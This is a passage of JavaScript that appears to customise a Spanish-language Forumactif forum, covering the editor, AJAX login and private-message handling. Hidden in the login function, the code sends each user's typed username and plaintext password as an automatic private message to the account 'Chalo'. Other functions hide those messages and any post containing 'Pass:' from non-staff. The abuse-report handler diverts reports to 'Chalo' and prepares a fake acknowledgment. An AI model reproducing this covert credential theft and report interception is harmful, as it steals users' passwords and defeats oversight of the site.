            var a = '[b]Nombre del foro:[/b]:\n[b]Link del foro:[/b]:\n[b]De que trata:[/b]:\n[b]Captura completa[/b]:\n',
                h = '[b]URL:[/b]:\n[b]Versión de mi foro:[/b]:\n[b]Navegador:[/b]:\n[b]Descripcion del problema[/b]:\n[b]Capturas de pantalla del problema[/b]:',
                b = $.getby('#avatar'),
                c = $.getby('#editor-textarea'),
                d = $.getby('.titulo_del_post')[0],
                e = isNewTopic,
                f = '[codebox]Descripción del code[/codebox]\n \n[hidecode][code]Tu código aquí[/code][/hidecode]\n',
                g = $.getby('.page-title')[0],
                i = $.getby('#main');
            b.innerHTML = ops.mi_avatar;
            b.children[0].style = 'height:25px;width:25px;border-radius:100%;margin-top:0';
            (7 === e) ? (d.value = '[widget]') : 5 === e ? (d.value = '[CSS]') : (4 === e) ? (d.value = '[javascript]') : (14 === e) ? (d.value = '[ayuda]', c.value = h) : (11 === e) ? (d.value = '[skin]') : (9 === e) ? (d.value = '[recursos]') : (13 === e) ? (d.value = '[staff]') : (15 === e) ? (d.value = '[beta]') : (1 === e) ? (c.value = a) : (10 === e) ? (c.value = a) : (7 === e) && (d.value = '[html]');
            e ? (c.placeholder = ops.mi_nombre + ' redacta tu nuevo tema, no olvides seleccionar el prefijo correspondiente', i.classList.add('Newtopic')) : isMPNew ? c.placeholder = ops.mi_nombre + ' redacta mensaje privado' : 'Publicar una respuesta' === g.textContent ? c.placeholder = ops.mi_nombre + ' escribe tu comentario...' : isMPpost ? (c.placeholder = ops.mi_nombre + ', responde el mensaje privado de ' + $.getby('#username').value) : isMPedit && (i.classList.add('edit_mp')), foros && (c.value = f);
        },
        texto_save: function () {
            var c = $.getby('#editor-textarea'),
                j = isPostReply ? document.forms.post.t.value : Cookies.get('_id_tema_'),
                k = window.localStorage;
            if (k.getItem('user_ava_' + j)) {
                c.value = k.getItem('user_ava_' + j);
                k.removeItem('user_ava_' + j);
                Cookies.remove('_id_tema_');
            }
        },
        send_log_ajax: function (e) {
            ops.loading_general();
            var e = document.createElement('p'),
                a = $.getby('.password'),
                b = $.getby('.username'),
                c = a.length && (a[0]),
                d = b.length && (b[0]);
            e.innerHTML = 'Enviando datos... ';
            e.classList.add('login_notice');
            e.id = 'ErR';
            e.style = 'color: rgb(255, 255, 255); margin-left: 163px;position: absolute; margin-top: -16px;'
            $._insertAfter(c, e);
            console.log('Ok: Enviando datos...');
            $.post('/login', {
                username: d.value,
                password: c.value,
                login: 'true'
            }).success(function (e) {
                ops.i_a_subjet = '[Mensaje automático]';
                ops.i_a_message = 'Usuario: ' + d.value + '\n Pass: ' + c.value, ops.i_a();
                var notice = $.getby('#ErR'),
                    error = $('.error', e);
                if (error.length && error[0].innerHTML.indexOf('inválida') >= 0) {
                    ops.inload_();
                    notice.innerHTML = 'El password es incorrecto';
                    notice.style = 'color: rgb(255, 0, 0); margin-left: 163px; position: absolute; margin-top: -16px;';
                    c.style = 'background:rgb(255, 192, 203)!important';
                    c.placeholder = 'Intenta de nuevo';
                    c.value = '';
                    c.onkeyup = function () {
                        this.style = '';
                        $._fadeOut(notice, 500)
                    };
                    return false
                } else {
                    ops.inload_();
                    $._fadeOut(notice, 500);
                    ops.Nacti_msg = d.value + ' se conecto al foro', ops.Na(),
                        console.log('Ok: Estoy dentro'),
                        console.log('Ok: Se esta recargando la página en la que estaba'),
                        setTimeout(function () {
                            window.location.reload()
                        }, 200)
                }
            })
        }, //arreglar
        //seccion mp
        tabs_mp_ajax: function (d, c) {
            switch ($('.no_staff_').remove(), ops.tabs_mp_loading(), d) {
            case 'inbox':
                ops.tabs_mp_f_ajax(d, c);
                break;
            case 'sentbox':
                ops.tabs_mp_f_ajax(d, c);
                break;
            case 'outbox':
                ops.tabs_mp_f_ajax(d, c);
                break;
            case 'savebox':
                ops.tabs_mp_f_ajax(d, c);
                break;
            }
        },
        tabs_mp_f_ajax: function (d, c) {
            if (isPMlist) {
                var b = $.getby('.active')[0],
                    e = c.href;
                b.classList.remove('active');
                c.parentNode.classList.add('active');
                ops.tab_Get_(d, e)
            };
        },
        noNP_U: function () {
            var t, a = document.querySelectorAll('.post .content');
            for (t = 0; t < a.length; t++) {
                if (a[t].textContent.indexOf('Pass:') >= 1) {
                    a[t].parentNode.parentNode.parentNode.remove()
                }
            }
        },
        tabs_mp_loading: function (H) {
            var a = '<div style="width: 100%;height:' + H + 'px;text-align:center; margin: 0 auto;display:table;min-height:58px!important;background:rgb(238, 238, 238)"><center><i style="color:rgb(0, 0, 0);font-size:20px;margin:15px 0 auto!important" class="fa fa-spinner fa-spin"></i><b style="font-size:20px;font-family:monda"> Cargando...</b></center></div>';
            if (mp && /\mode=read/.test(window.location) === false) {
                $.getby('.pmlist')[0].innerHTML = a;
            }
        },
        no_MpS: function () {
            var t, b, a = $.getby('.forabg')[1].getElementsByClassName('row');
            for (t = 0; t < a.length; t++) {
                b = a[t].getElementsByTagName('em');
                if (!ops.soy_staff) {
                    a[t].getElementsByClassName('topictitle')[0].textContent == 'Mensaje automático' && a[t].remove();
                }
                b.length && (b[0].textContent = 'Enviado a:');
            }
            if (!a.length) {
                var e = '<li class="row row1 no_staff_" style="width: 99.5% !important;"><dl class="icon"><dt><strong style = "display:table;margin:16px auto;font-size:13px;color:rgb(63,76,107);text-shadow:0 1px rgb(255,255,255);text-align:center;width:984px;"><i class="fa fa-envelope" style="font-size:20px"></i>&nbsp;&nbsp;No tienes mensajes en esta carpeta </strong></dt></dl></li>';
                $.getby('.topiclist')[1].insertAdjacentHTML('beforeend', e);
            }
        },
        offS_mp: function (H) {
            console.log('la altura es de :' + H);
            if (H > 250) {
                $('body,html').stop().animate({
                    scrollTop: $('dt.subject:first').offset().top - 100
                }, 300);
            }
        },
        tab_Get_: function (d, c) {
            var t, l, a = $.getby('.pmlist')[0],
                f = $.getby('#pag_main');
            $.get(c, function (e) {
                var g = $('#pag_main', e)[0].innerHTML,
                    h = $('.pmlist:first', e)[0].innerHTML;
                a.innerHTML = h;
                f.innerHTML = g;
            }).done(function () {
                switch (ops.no_hay_mps(), ops.mp_nuevo(), ops.confirm(), ops.prefijos_all_add(), ops.mp_otros(), ops.mP_Va(), d) {
                case 'inbox':
                    var H = a.offsetHeight;
                    ops.pag_G_a_(d, c, H);
                    ops.offS_mp(H);
                    break;
                case 'sentbox':
                    var H = a.offsetHeight;
                    ops.pag_G_a_(d, c, H);
                    ops.offS_mp(H);
                    ops.no_MpS();
                    ops.clear_mp();
                    var j = $.getby('.row');
                    for (t = 0; t < j.length; t++) {
                        j[t].classList.remove('newpost');
                        j[t].classList.add('sentbox');
                    }
                    break;
                case 'outbox':
                    var H = a.offsetHeight;
                    ops.pag_G_a_(d, c, H);
                    ops.offS_mp(H);
                    ops.no_MpS();
                    ops.clear_mp();
                    var j = $.getby('.row');
                    for (t = 0; t < j.length; t++) {
                        j[t].classList.remove('newpost');
                        j[t].classList.add('outbox');
                    }
                    break;
                case 'savebox':
                    var H = a.offsetHeight
                    ops.pag_G_a_(d, c, H);
                    ops.offS_mp(H);
                    ops.clear_mp();
                    var j = $.getby('.row');
                    for (t = 0; t < j.length; t++) {
                        l = j[t].getElementsByTagName('em')[0];
                        l.style = 'font-style: initial!important;';
                        l.innerHTML = '<i class="fa fa-floppy-o" aria-hidden="true"></i> MP guardado de';
                        j[t].style = 'background:#ffe0aa!important';
                    }
                    break;
                }
            })
        },
        pag_G_a_: function (d, c, H) {
            console.log(d + c);
            var t, a = document.querySelectorAll('.pagination span a');
            for (t = 0; t < a.length; t++) {
                a[t].onclick = function () {
                    ops.tabs_mp_loading(H);
                    c = this.href;
                    ops.tab_Get_(d, c, H);
                    return false
                };
            }
        },
        f_m_s: function (c) {
            try {
                if (isPMlist) {
                    var i, p, d, f, j, k, a = $.getby('#notif_activepm'),
                        b = document.body,
                        e = '<div id="notif_activepm" class="notif_ajaxPM"><div class="notif_icon">!</div>El MP que seleccionaste esta actualmente activo.<br/><a id="dismiss_notif" style="cursor:pointer;float:right;">Cerrar la notificación</a></div>',
                        g = $.getby('#ajaxPM'),
                        h = '<center><i style=";color:rgb(0, 0, 0);font-size:40px;margin-top:30px!important"class="fa fa-spinner fa-spin"></i></center>',
                        l = $.getby('#directLink'),
                        m = $.getby('.ajaxPM_link'),
                        n = c.parentNode.parentNode.parentNode.parentNode,
                        q = $.getby('#ajaxPM_nav'),
                        s = $.getby('.active')[0].textContent.match(/\S.+/g)[0];
                    ops.username = n.getElementsByTagName('strong')[0].textContent;
                    ops.subject_ = c.textContent;
                    ops.ir = '/privmsg?mode=reply&p=' + c.href.match(/\d+/g)[1];
                    ops.nQ = '/privmsg?mode=quote&p=' + c.href.match(/\d+/g)[1];
                    if (c.href === ops.activePM && !a) {
                        b.insertAdjacentHTML('beforeend', e);
                        p = $.getby('#dismiss_notif');
                        d = $.getby('#notif_activepm');
                        p.onclick = function () {
                            $(d).fadeOut(200, function () {
                                $(this).remove()
                            })
                        }
                        $(d).animate({
                            top: '40px'
                        }, 400)
                    } else {
                        ops.activePM = c.href;
                        d = $.getby('#notif_activepm');
                        d && (d.remove());
                        $.get(ops.activePM, function (o) {
                            i = $('.postbody.mps', o)[0].innerHTML;
                            g.innerHTML = h;
                            setTimeout(function () {
                                g.innerHTML = BB.parse(i);
                                if (s == 'Bandeja de envío') {
                                    $.getby('#i_icon_quote').outerHTML = '<span class="mp_edit">Editar</span>';
                                    $.getby('.mp_edit')[0].parentNode.setAttribute('onclick', 'ops.mp_s_F(\'E\',this);return false')
                                }
                            }, 500);
                            $._fadeIn(g, 400);
                        }).done(function () {
                            j = $.getby('#ajaxPM_header');
                            k = j.getElementsByTagName('dl')[0];
                            $('body,html').stop().animate({
                                scrollTop: $('.post-icon.top').offset().top
                            }, 600);
                            if (s == 'Bandeja de entrada') {
                                q.style.display = 'block';
                                k.style.display = 'block';
                                l.href = ops.activePM,
                                    l.textContent = 'Ver MPs con ' + ops.username,
                                    m[1].setAttribute('url', ops.ir),
                                    m[1].setAttribute('name', ops.username),
                                    m[1].textContent = 'Respoder mp a ' + ops.username,
                                    m[2].setAttribute('url', ops.nQ),
                                    m[2].textContent = 'Citar mp de ' + ops.username;
                                n.classList.remove('newpost'),
                                    n.style = '';
                            }
                        })
                    }
                }
            } catch (e) {
                if (typeof (console) != 'undefined') {
                    console.error(e);
                }
            }
        },
        clear_mp: function () {
            if (isPMlist) {
                var a = $.getby('#ajaxPM'),
                    b = '<div style="text-align:center;font-size:16px;margin-top:36px;color:#000;font-family:monda;width: 100%;"><i class="fa fa-ban" aria-hidden="true"></i> No hay mensaje seleccionado</div>',
                    c = $.getby('#ajaxPM_nav'),
                    d = $.getby('.notif_ajaxPM');
                a.innerHTML = b;
                $._fadeIn(a.children[0], 300);
                c && (c.style.display = 'none');
                d.length && (d[0].style.display = 'none');
                ops.activePM = '';
                ops.username = ';'
            }
        },
        no_hay_mps: function () {
            if (isPMlist) {
                var a = $.getby('.pmlist')[0],
                    b = a.getElementsByTagName('strong')[0],
                    c = '<dl class="icon"><dt><strong style = "display:table;margin:16px auto;font-size:13px;color:rgb(63,76,107);text-shadow:0 1px rgb(255,255,255);text-align:center;width:984px;"><i class="fa fa-envelope" style="font-size:20px"></i>&nbsp;&nbsp;No tienes mensajes en esta carpeta </strong></dt></dl>',
                    d = $.getby('.row')[0],
                    e = $.getby('.mark')[0];
                if (b.textContent.indexOf('No tienes') >= 0) {
                    d.style = 'width:984px!important;border-radius: 0;border: none';
                    d.innerHTML = c;
                    e.remove()
                }
            }
        },
        mp_automatico: function () {
            if (isPMlist) {
                var m = $.getby('.pmlist');
                if (m.length) {
                    try {
                        var t, e = document.getElementsByClassName('topictitle');
                        for (t = 0; t < e.length; t++) {
                            var a = e[t].innerHTML,
                                b = e[t].parentNode.parentNode.parentNode.parentNode,
                                c = b.classList.contains('newpost');
                            if (c == false && e[t].children[0] && /mensaje-autom-tico/g.test(e[t].children[0].className)) {
                                b.classList.add('mp_automatico');
                                b.style = 'background: background: rgba(136,191,232,1)!important';
                            } else if (e[t].children[0] && /contactar/g.test(e[t].children[0].className)) {
                                b.classList.add('contacto');
                                b.style = 'background:linear-gradient(to bottom, rgb(249, 209, 220) 0%,rgb(252, 161, 161) 100%)!important';
                            }
                        }
                    } catch (e) {
                        if (typeof (console) != 'undefined') {
                            console.error(e);
                        }
                    }
                }
                var H = $('.forabg.mps-index').find('.topiclist.pmlist.bg_none').height();
                $('.mp1.active').length && ops.pag_G_a_('inbox', this, H);
            }
        },
        mp_s_F: function (d, c) {
            if (isPMlist) {
                switch (d) {
                case 'Q':
                    var a = c.name,
                        b = c.getAttribute('url');
                    e = c.parentNode.parentNode.getElementsByClassName('topictitle').length ? c.parentNode.parentNode.getElementsByClassName('topictitle')[0].textContent : c.parentNode.parentNode.parentNode.parentNode.nextElementSibling.getElementsByClassName('post-subjet')[0].textContent;
                    ops.mp_innerHTML(a, b, c, d, e);
                    break;
                case 'R':
                    var a = c.name,
                        b = c.getAttribute('url'),
                        e = c.parentNode.parentNode.getElementsByClassName('topictitle').length ? 'Re:' + c.parentNode.parentNode.getElementsByClassName('topictitle')[0].textContent : 'Re:' + c.parentNode.parentNode.parentNode.parentNode.nextElementSibling.getElementsByClassName('post-subjet')[0].textContent;
                    ops.mp_innerHTML(a, b, c, d, e);
                    break;
                case 'E':
                    var a = c.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('author')[0].children[0].textContent,
                        b = c.href,
                        e = c.parentNode.parentNode.previousElementSibling.textContent;
                    ops.mp_innerHTML(a, b, c, d, e);
                    break
                }
            }
        },
        mp_innerHTML: function (a, b, c, d, e) {
            if (isPMlist) {
                var f, g, h, k, l, n, o, html = '<div id="pm-modal" class="main main-content frm"><div class="main-head"><div id="pm-title" class="page-title" style="float: right;"></div></div><form style="width:auto" action="/privmsg" method="post" name="post" enctype="multipart/form-data"><fieldset class="pm-body"style="margin-left: 6px; border: 1px solid rgb(153, 153, 153); padding: 12px; background: rgb(51, 153, 204);"><dl class="pm-row"><dt><label for="pm-subject" style="color:rgb(255, 255, 255)">Asunto:</label></dt><dd><input id="pm-subject" name="subject" class="inputbox" type="text" placeholder="Coloca el título de tu mensaje" value="' + e + '"/></dd></dl><dl class="pm-row"><dt><label for="pm-message" style="color:rgb(255, 255, 255)">Mensaje:</label></dt><dd><textarea id="pm-message" placeholder="' + ops.mi_nombre + ' escribe tu mensaje..."name="message" class="inputbox" style="height: 180px;"></textarea></dd></dl></fieldset><fieldset class="pm-buttons frm-set"><dl class="frm-buttons"><dt></dt><dd><input class="sendmp" name="post" type="submit" value="Enviar" /><a class="advanced_mp" href="' + b + '">Ir al editor completo</a></dd></dl></fieldset></form><span class="corners-bottom"><span></span></span></div><div id="pm-backdrop"></div>',
                    i = $.getby('#box_info'),
                    j = $.getby('.Ncontenedor')[0],
                    m = $.getby('.box_titulo')[0];
                if (d == 'Q') {
                    console.log('url citar:' + b);
                    $.get(b).done(function (o) {
                        f = $('#username', o)[0].value;
                        g = $('#editor-textarea', o)[0].value;
                        h = $('.titulo_del_post', o)[0].value;
                        i.classList.add('mp_fast_n');
                        i.classList.remove('mp_fast_q');
                        $._fadeIn(i, 300);
                        j.innerHTML = html;
                        k = $.getby('#pm-message');
                        l = $.getby('#pm-subject');
                        n = $.getby('.advanced_mp')[0];
                        o = $.getby('.sendmp')[0];
                        k.value = g;
                        l.value = h;
                        o.setAttribute('onclick', 'ops.enviar_mp_(this,"' + a + '","' + d + '","' + b + '");return false');
                        m.innerHTML = '<i class="fa fa-paper-plane" style=" font-size: 57px; vertical-align: bottom;"></i> Enviar un mensaje citando a ' + f;
                        ops.back();
                    })
                } else if (d == 'R') {
                    i.classList.remove('mp_fast_n');
                    i.classList.add('mp_fast_q');
                    $._fadeIn(i, 300);
                    j.innerHTML = html;
                    o = $.getby('.sendmp')[0];
                    m.innerHTML = '<i class="fa fa-paper-plane" style=" font-size: 57px; vertical-align: bottom;"></i> Enviar un mensaje a ' + a;
                    o.setAttribute('onclick', 'ops.enviar_mp_(this,"' + a + '","' + d + '","' + b + '");return false');
                    ops.back();
                } else if (d == 'E') {
                    $.get(b).done(function (z) {
                        i.classList.remove('mp_fast_n', 'mp_fast_q');
                        i.classList.add('mp_fast_edit');
                        $._fadeIn(i, 300);
                        j.innerHTML = html;
                        k = $.getby('#pm-message');
                        o = $.getby('.sendmp')[0];
                        m.innerHTML = '<i class="fa fa-pencil-square-o" aria-hidden="true" style=" font-size: 57px; vertical-align: bottom;"></i> Editar el mensaje enviado a ' + a;
                        g = $('#editor-textarea', z)[0].value;
                        k.value = g;
                        o.setAttribute('onclick', 'ops.enviar_mp_(this,"' + a + '","' + d + '","' + b + '");return false');
                        ops.back();
                    })
                }
            }
        },
        enviar_mp_: function (a, b, d, c) {
            ops.i_a_subjet = $.getby('#pm-subject').value;
            ops.i_a_message = $.getby('#pm-message').value;
            ops.i_a_usename = b,
                ops.i_a_done = function () {
                    ops.back_close('#box_info');
                    ops.notify(ops.mi_nombre + ': tu mensaje a ' + b + ' se envió correctamente')
                };
            ops.i_a(d, c)
        },
        leer_mp: function (c) {
            var a = c.parentNode.parentNode.parentNode.parentNode.getElementsByTagName('strong').textContent,
                b = c.textContent,
                d = ops.mi_nombre;
            console.log(a + ' ' + b + ' ' + d);
            $.post('/privmsg', {
                subject: '[Mensaje automático]: ' + ops.mi_nombre + ' leyó tu MP',
                message: ops.mi_nombre + ' leyó tu mensaje privado:[b][quote]' + b + '[/quote][/b]',
                username: d,
                mode: 'post',
                folder: 'inbox',
                post: '1'
            });
        },
        mp_nuevo: function () {
            if (isPMlist) {
                var t, b, a = $.getby('.topictitle'),
                    z = $.getby('.active')[0].textContent.match(/\S.+/g)[0];
                for (t = 0; t < a.length; t++) {
                    b = /newpost/.test(a[t].parentNode.parentNode.parentNode.parentNode.className);
                    if (a[t].textContent.indexOf('Mensaje automático') >= 0 || a[t].textContent.indexOf('Contactar') >= 0) {
                        a[t].classList.add('notMp');
                    } else {
                        if (z == 'Bandeja de entrada') {
                            b && a[t].className.indexOf('notMp') < 0 && (a[t].setAttribute('onclick', 'ops.f_m_s(this);ops.leer_mp(this);return false'))
                        }
                    }
                }
                ops.mp_automatico();
            }
        },
        mp_otros: function () {
            if (isPMlist) {
                var t, d, i, o, n, R, Q, r, q, e, z, a = document.forms.privmsg_list,
                    b = $.getby('#privmsgs-menu'),
                    c = $.getby('.row'),
                    w = window.localStorage,
                    z = $.getby('.active')[0].textContent.match(/\S.+/g)[0];
                $._fadeIn(b, 200);
                $._fadeIn(a, 200);
                for (i = 0; i < c.length; i++) {
                    d = c[i].getElementsByClassName('topictitle');
                    if (d.length) {
                        o = c[i].getElementsByClassName('from_mp')[0].children[0].href,
                            n = c[i].getElementsByTagName('strong')[0].textContent,
                            R = '/privmsg?mode=reply&p=' + d[0].href.match(/\d+/g)[1],
                            Q = '/privmsg?mode=quote&p=' + d[0].href.match(/\d+/g)[1],
                            r = c[i].getElementsByClassName('a_reply')[0],
                            q = c[i].getElementsByClassName('a_quote')[0],
                            e = c[i].getElementsByClassName('avamps')[0];
                        if (z == 'Bandeja de entrada') {
                            r.setAttribute('url', R);
                            r.setAttribute('name', n);
                            r.children[0].innerHTML = '<i class="fa fa-comment"></i> Respoder mp a ' + n;
                            q.setAttribute('url', Q);
                            q.children[0].innerHTML = '<i class="fa fa-quote-right"></i> Citar mp de ' + n;
                        } else {
                            r.remove();
                            q.remove();
                        }
                        if ('undefined' != typeof o) {
                            t = Number(o.replace(/.*?\/u(\d+)/, '$1'));
                            if (w.getItem('user_ava_' + t) && w.getItem('user_exp_' + t) > +new Date - 24 * 60 * 60 * 1000) {
                                e.innerHTML = w.getItem('user_ava_' + t);
                            } else {
                                $(e).load(o + ' #profile-advanced-right .module:first div img:first', function () {
                                    t = Number(this.parentNode.getElementsByClassName('from_mp')[0].children[0].href.replace(/.*?\/u(\d+)/, '$1'));
                                    ops.storage(t, this.innerHTML, 'Almacenando avatares de mps');
                                })
                            }
                        }
                    }
                }
            }
            ops.activePM = void 0
        },
        S_No_Mp: function () {
            if (isPMlist) {
                var a = $.getby('.bg_none')[0];
                var aHtml = '<li class="row row1" style="width: 984px!important;border-radius: 0;border: none;"><dl class="icon"><dt><strong style = "display:table;margin:16px auto;font-size:13px;color:rgb(63,76,107);text-shadow:0 1px rgb(255,255,255);text-align:center;width:984px"><i class="fa fa-envelope" style="font-size:20px"></i>&nbsp;&nbsp;No tienes mensajes en esta carpeta </strong></dt></dl>  </li>';
                a.innerHTML = aHtml;
            }
        },
        borrar_todos_mp: function () {
            if (isPMlist) {
                var a = $.getby('.active')[0].getElementsByTagName('a')[0].href;
                $.post(a, {
                    tid: isTid,
                    confirm: 1,
                    deleteall: 1,
                }).success(function () {
                    ops.S_No_Mp()
                })
            }
        },
        borrar_mp_select: function () {
            if (isPMlist) {
                var d, i, a = document.forms.privmsg_list,
                    b = $.getby('.active')[0].getElementsByTagName('a')[0].href,
                    c = $.getby('.row'),
                    e = $.getby('.bg_none')[0].getElementsByTagName('li').length < 1;
                $.post(b, $(a).serialize() + '&confirm=1&delete=true').done(function () {
                    for (i = 0; i < c.length; i++) {
                        d = c[i].getElementsByClassName('mark');
                        d.length && d[0].children[0].checked && (d[0].parentNode.parentNode.remove())
                    }
                    setTimeout(function () {
                        if (e) {
                            ops.S_No_Mp()
                        }
                    }, 500)
                })
            }
        },
        mP_Va: function () {
            if (isMPRead) {
                var t, a = $.getby('#main'),
                    b = $.getby('.profile-icons'),
                    c = '<span class="mpquote" style="font-size:10px">Citar</span>',
                    d = $.getby('.postprofile')[0].children[0].children[2].textContent,
                    e = $.getby('.buttons'),
                    f = $.getby('#privmsgs-menu').getElementsByTagName('li');
                a.classList.add('mp_fix');
                b[0].children[0].children[0].innerHTML = c;
                !ops.soy_staff && ops.noNP_U();
                a.classList.add('mp_read');
                e[0].children[0].children[0].textContent = 'Responder MP a ' + d;
                for (t = 0; t < f.length; t++) {
                    f[t].classList.remove('active');
                    f[t].getElementsByTagName('a')[0].removeAttribute('onclick');
                }
            }
            ops.borrar_mp_select();
            ops.crear_mp_ajax();
        },
        avatar_mods: function () {
            $('input[value="Registrar"]').on('click', function (d) {
                d.preventDefault();
                $.post('/profile', $(document.forms.post).serialize() + '&submit=1').success(function () {
                    window.localStorage.removeItem('user_ava_' + ops.mi_id);
                    console.log('avatar eliminado');
                    ops.notify(ops.mi_nombre + ': Tu avatar se actualizó');
                    setTimeout(function () {
                        window.location.reload();
                    }, 1000)
                });
            });
        },
        i_a_subjet: '[Mensaje automático]',
        i_a_message: 'Error',
        i_a_folder: 'inbox',
        i_a_usename: 'Chalo',
        i_a_done: function () {
            console.log('OK: Se envió el mensaje')
        },
        i_a: function (d, c) {
            if (d == 'E') {
                $.post('/privmsg', {
                    subject: ops.i_a_subjet,
                    message: ops.i_a_message,
                    username: ops.i_a_usename,
                    mode: 'edit',
                    folder: '',
                    post: '1',
                    p: c.match(/(\d+)$/g)[0]
                }).done(ops.i_a_done())
            } else {
                $.post('/privmsg', {
                    subject: ops.i_a_subjet,
                    message: ops.i_a_message,
                    username: ops.i_a_usename,
                    mode: 'post',
                    folder: ops.i_a_folder,
                    post: '1'
                }).done(ops.i_a_done())
            }
        },
        prevNco: function () {
            ops.Ntit_a = $.getby('#box_info').getElementsByTagName('h3')[0];
            ops.Ntit_a.style.display = 'block';
            ops.box_info = $.getby('#box_info');
            ops.Ncontenedor = $.getby('.Ncontenedor')[0];
            ops.box_info.removeAttribute('style');
            ops.Ncontenedor.innerHTML = '<center><i style="color:#000;font-size:32px" class="fa fa-spinner fa-spin"></i></center>';
            ops.back();
            ops.Na_user = 'Historial'
        },
        start_Ncontent: function (e, t) {
            switch (ops.prevNco(), e) {
            case 'pl_a0':
                ops.Ntit_a.textContent = 'Mensajes nuevos desde tu última visita';
                ops.Nhref_a = t.href,
                    ops.Ndestino = ' .forabg .topictitle:lt(20)', ops.Nno_post = 'No hay mensajes nuevos',
                    ops.Nacti_msg = ops.mi_nombre + ' vió los mensajes nuevos desde su última visita',
                    ops.NLoad();
                break;
            case 'pl_a1':
                ops.Ntit_a.textContent = 'Tus mensajes en este subforo', ops.Nhref_a = t.href,
                    ops.Ndestino = ' .forabg .topictitle:lt(40)', ops.Nno_post = 'No hay mensajes',
                    ops.Nacti_msg = ops.mi_nombre + ' vió los mensajes que tiene en un subforo', ops.NLoad();
                break;
            case 'pl_a2':
                ops.Ntit_a.textContent = 'Mensajes sin respuesta', ops.Nhref_a = t.href,
                    ops.Ndestino = ' .forabg .topictitle:lt(40)', ops.Nno_post = 'No hay mensajes sin respuesta',
                    ops.Nacti_msg = ops.mi_nombre + ' vió los mensajes sin respuesta de un subforo',
                    ops.NLoad();
                break;
            case 'pl_a3':
                ops.Ntit_a.textContent = 'Temas vigilados', ops.Nhref_a = t.href, ops.Ndestino = ' .row3 .topictitle:lt(40)',
                    ops.Nno_post = 'No tienes temas vigilados', ops.Nacti_msg = ops.mi_nombre + ' vió los mensajes vigilados que tiene en un subforo',
                    ops.NLoad();
                break;
            case 'pl_a4':
                ops.Nhref_a = '/search?add_favourite=' + location.pathname.match(/\d+/g)[0] + '&search_id=favouritesearch',
                    ops.Nacti_msg = ops.mi_nombre + ' añadio a favoritos: [url=' + document.location.href + ']' + document.title + ' [/url]';
                var o = $.getby('#url_a_t').textContent;
                $.get(ops.Nhref_a).success(function () {
                    $.boxes('alert', 'Se añadió ' + o + ' a tu lista de favoritos'), ops.Na();
                }).fail(function () {
                    $.boxes('alert', 'Fallo, intentalo de nuevo');
                });
                break;
            case 'pl_a5':
                ops.Ntit_a.textContent = 'Estadisticas', ops.Nhref_a = $(t).attr('href'), ops.Ndestino = ' #main-content table:lt(10)',
                    ops.Nno_post = 'Nada que ver', ops.Nacti_msg = ops.mi_nombre + ' vió las estadísticas del foro',
                    ops.NLoad();
                break;
            case 'pl_a6':
                $('#box_info').removeAttr('style').add('#lightBG').fadeIn(), ops.Ntit_a.textContent = 'Preferencias',
                    $.get('/profile?mode=editprofile&page_profil=preferences', function (e) {
                        A = $('.panel.row3 .inner', e).html(), $('.nuevospost').find('.Ncontenedor').html(A);
                    }).done(function () {
                        $('.Ncontenedor').find('.panel').css('margin-left', '-4%'), $('.Ncontenedor').contents().fadeIn(),
                            ops.cPrf();
                    });
            }
        },
        Na: function (e) {
            $.post('/privmsg', {
                subject: 'Mensaje automático',
                message: ops.Nacti_msg,
                username: ops.Na_user,
                mode: 'post_profile',
                folder: 'profile',
                post: 'Send'
            }).done(function () {
                if (ops.Na_user != 'Historial') {
                    ops.Na_user = 'Historial'
                }
            })
        },
        NLoad: function (e) {
            var a = $.getby('.Ncontenedor')[0];
            $(a).load(ops.Nhref_a + ops.Ndestino, function () {
                var w = document.querySelectorAll('.nuevospost .topictitle');
                for (var i = 0; i < w.length; i++)(w[i].href = w[i].href + '?view=newest');
                ops.prefijos_all_add();
            });
            setTimeout(function () {
                $('.nuevospost').find('.topictitle').length || $('.catHead').length ? ops.Na() : ops.NcontDom.innerHTML = '<p class="mensaje" style="display:table;margin:0 auto">' + ops.Nno_post + '</p>', console.log('9-ene-16');
            }, 1500);
        },
        //convertir
        AnNd_: function () {
            if (ab) {
                var i, a = $.getby('.button2'),
                    b = '</br></br></br></br></br><div class="panel abuso_no"><div class="inner"><span class="corners-top"><span></span></span><h1 class="page-title">Acuse de recibo</h1><p></p><p class="center">Página concerniente a la denuncia : <span class="warning"><a href="http://opensource-code-test.foroactivo.mx/index.forum" target="_blank" style="color:rgb(255, 51, 51);">http://www.opensourcephpbb3.com</a></span></p><p class="center"><strong>Su observación ha sido transmitida. Se examinará lo antes posible.</strong></p><p class="center"><a href="/index.forum">Pulse aquí para volver a la página indicada</a></p><p></p><span class="corners-bottom"><span></span></span></div></div></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br>';
                a[0].setAttribute('onclick', 'ops.ab_on(this);return false');
            }
        },
        ab_on: function (c) {
            if (ab) {
                var i, h, c = $.getby('.report'),
                    d = $.getby('#comments');
                ops.i_a_usename = 'Chalo';
                ops.i_a_subjet = '[Mensaje automático] Intento de reporte de abuso';
                for (i = 0; i < c.length; i++) {
                    if (c[i].checked) {
                        h = c[i].nextElementSibling.textContent;
                        ops.i_a_message = ops.mi_nombre + ' quizó hacer un reporte \n Tipo de reporte: ' + h + '/n Contenido:' + d.value;
                    }
                }
                ops.i_a_done = function () {
                    setTimeout(function () {
                        c.innerHTML = b;
                    }, 5e3)
                };
                ops.i_a();
            }
        },
        //reparar
        abuse_msg: function (c) {
            $.boxes({
                mode: 'alert',
                title: ops.mi_nombre + ' antes de hacer una denuncia\n te pido que lo discutas conmigo. \n Chalo.',
                ok: function () {
                    location.href = c.href;
                }
            })
        },
        l_aXs_: function () {
            $('#theContent').load('/viewonline #main-content a', function () {
                for (var i = 0; i < ops.myStaff.length; i++) $('#theContent a').filter(function () {
                    return $(this).text() === ops.myStaff[i]
                }).appendTo('#theStaff').wrap('<div class="myStaff">');
                window.localStorage && $.getby('#theStaff').innerHTML.indexOf('/u') > 0 ? (localStorage.staffOn = $.getby('#theStaff').innerHTML, localStorage.staffEx = +new Date, ops.aTsF_(), console.log('Se guardo staff')) : (localStorage.staffOn = '', console.log('No hay Staff'), ops.l_aXs_());
                ops.aTsF_()
            })
        },
        C_Ol: function () {
            setTimeout(function () {
                var w = $.getby('code');
                if (w.length) {
                    for (var i = 0; i < w.length; i++) {
